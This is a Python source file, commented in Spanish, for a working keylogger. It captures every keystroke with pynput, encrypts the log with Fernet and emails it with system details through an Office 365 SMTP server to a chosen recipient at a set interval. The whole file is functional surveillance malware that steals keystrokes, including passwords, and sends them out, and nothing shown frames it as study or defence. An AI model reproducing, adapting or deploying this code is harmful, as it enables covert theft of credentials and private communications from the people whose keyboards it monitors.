"""
Keylogger para capturar teclas, cifrar los datos y enviarlos por correo electrónico.

"""

import os
import smtplib
import threading
import argparse
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import platform

from cryptography.fernet import Fernet
from pynput import keyboard
from dotenv import load_dotenv

load_dotenv()

class Keylogger:
    """
    Clase para capturar teclas, cifrar los datos y enviarlos por correo electrónico.
    """

    def __init__(self, email: str, password: str, recipient: str, interval: int):
        """
        Inicializa el keylogger con las credenciales de correo y destinatario.

        :param email: Dirección de correo del remitente
        :param password: Contraseña del correo del remitente
        :param recipient: Dirección de correo del destinatario
        :param interval: Intervalo en segundos para enviar los correos
        """
        self.log = ""
        self.email = email
        self.password = password
        self.recipient = recipient
        self.interval = interval
        self.key = self.load_key()
        self.cipher_suite = Fernet(self.key)

    def load_key(self) -> bytes:
        """
        Carga la clave de cifrado desde un archivo.

        :return: Clave de cifrado en bytes
        """
        passfile = os.environ.get("passfile")
        if not passfile:
            print("Error: La variable de entorno 'passfile' no está definida.")
            sys.exit(1)
        return open(passfile, 'rb').read()

    def on_press(self, key: keyboard.Key):
        """
        Callback para manejar la captura de teclas.

        :param key: Tecla presionada
        """
        try:
            if key.char is not None:
                self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f" {str(key)} "

    def encrypt_log(self) -> bytes:
        """
        Cifra el log de teclas capturadas.

        :return: Log cifrado en bytes
        """
        return self.cipher_suite.encrypt(self.log.encode())

    def send_mail(self):
        """
        Envía el log cifrado por correo electrónico según el intervalo especificado.
        """
        if self.log:
            try:
                encrypted_log = self.encrypt_log()
                print("Encrypted log:", encrypted_log)  # Imprimir el log cifrado

                # Crear el mensaje del correo electrónico
                msg = MIMEMultipart()
                msg['From'] = self.email
                msg['To'] = self.recipient
                msg['Subject'] = "Log de teclas cifrado"

                # Adjuntar el log cifrado como un archivo de texto
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(encrypted_log)
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="log.txt"')
                msg.attach(part)

                # Información del sistema operativo
                system_info = f"Sistema operativo: {platform.system()} {platform.release()} ({platform.version()})"
                msg.attach(MIMEText(system_info, 'plain'))

                # Conectar al servidor SMTP y enviar el correo
                server = smtplib.SMTP('smtp.office365.com', 587)
                server.starttls()
                server.login(self.email, self.password)
                server.send_message(msg)
                server.quit()
            except smtplib.SMTPException as e:
                print(f"Error al enviar correo: {e}")
            self.log = ""
        threading.Timer(self.interval, self.send_mail).start()

    def start(self):
        """
        Inicia el keylogger y el envío periódico de correos electrónicos.
        """
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.send_mail()
        listener.join()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keylogger para capturar teclas y enviar logs cifrados por correo electrónico.")
    parser.add_argument('--interval', type=int, required=True, help='Intervalo en segundos para enviar los correos.')
    parser.add_argument('--recipient', type=str, required=True, help='Dirección de correo del destinatario.')
    args = parser.parse_args()

    keylogger = Keylogger(
        email=os.environ.get("email"),
        password=os.environ.get("password"),
        recipient=args.recipient,
        interval=args.interval
    )
    keylogger.start()
